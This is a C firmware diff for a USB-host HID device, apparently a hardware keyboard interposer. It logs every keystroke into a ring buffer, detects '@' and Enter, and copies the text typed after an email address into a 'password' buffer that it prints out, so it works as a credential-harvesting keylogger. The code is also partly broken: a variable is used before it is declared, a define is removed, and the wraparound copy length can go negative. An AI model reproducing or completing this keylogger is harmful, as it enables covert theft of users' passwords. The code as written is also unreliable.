@@ -12,11 +12,17 @@
 
 #include "usbh/debug.h"
 #include "usbh/dev/hid.h"
+#include <string.h>
 
-#define NB_INPUT 200
-char input_tab[NB_INPUT];
+static char input_tab[NB_INPUT];
+static int  input_index = 0;
+static int  start_password_idx = 0;
+
+char        password[NB_INPUT];
+int         password_size;
+
 //extern var
-uint8_t  led_status = 7;
+uint8_t    led_status = 7;
 
 static THD_WORKING_AREA(waTestHID, 1024);
 
@@ -26,17 +32,18 @@ static void _hid_report_callback(USBHHIDDriver *hidp, uint16_t len)
     uint8_t *report = (uint8_t *)hidp->config->report_buffer;
 
     //get every input in a tab
-    static int input_index = 0;
+    rtt_printf("Key code: %02X\n", input);
     char input = hid2azerty(report);
     if(input) {
         input_tab[input_index] = input;
+        usbh_email_detector(input);
         if(input_index++ >= 200)
             input_index = 0;
     }
 
     if(hidp->type == USBHHID_DEVTYPE_BOOT_KEYBOARD) {
         /* send the key on the computer */
-        usb_report(&UHD2, report, 8);
+        //usb_report(&UHD2, report, 8);
         if(report[2] == KEY_F2) {
             rtt_printf("=== INPUT ===");
             for(int i = 0; i < NB_INPUT; i++)
@@ -100,20 +107,35 @@ void usbh_init(void)
     chThdCreateStatic(waTestHID, sizeof(waTestHID), NORMALPRIO, ThreadTestHID, 0);
 }
 
-void usbh_email_detector(void)
+void usbh_email_detector(char input)
 {
-//  int input_index = 0;
+    if(password_size + PASSWORD_MAX_SIZE > PASSWORD_BUFFER_SIZE) { // avoid max password buffer
+        rtt_printf("[WARNING] Password buffer full\n");
+        return;
+    }
+    // check if current input is interesting
+    switch(input) {
+        case '@': // email is expected
+            rtt_printf("@ detected\n");
 
-//  //find enter input
-//  for(int index_enter=0; index_enter<NB_INPUT; index_enter++)
-//  {
-//      if(input_tab[index_enter] == '\n')
-//      {
-//          for(int index_at = index_enter; index_at>...
-//      }
-
-//  //no enter input
-//  if(input_index == NB_INPUT) return;
-
-    //find @
+            break;
+        case '\n': // password is expected
+            rtt_printf("[enter] detected\n");
+            int len = input_index - start_password_idx;
+            if(len > PASSWORD_MAX_SIZE)
+                len = PASSWORD_MAX_SIZE;
+            if(start_password_idx > input_index) { // buffer made a loop
+                int bytes_written = NB_INPUT - start_password_idx;
+                memcpy(password + password_size, input_tab + start_password_idx, bytes_written);
+                memcpy(password + password_size + bytes_written, input_tab, len - bytes_written);
+            }
+            else
+                memcpy(password + password_size, input_tab + start_password_idx, len);
+            start_password_idx = input_index;
+            password_size += len;
+            // print password buffer
+            password[password_size] = '\0';
+            rtt_printf("password buffer: %s\n", password);
+            break;
+    }
 }
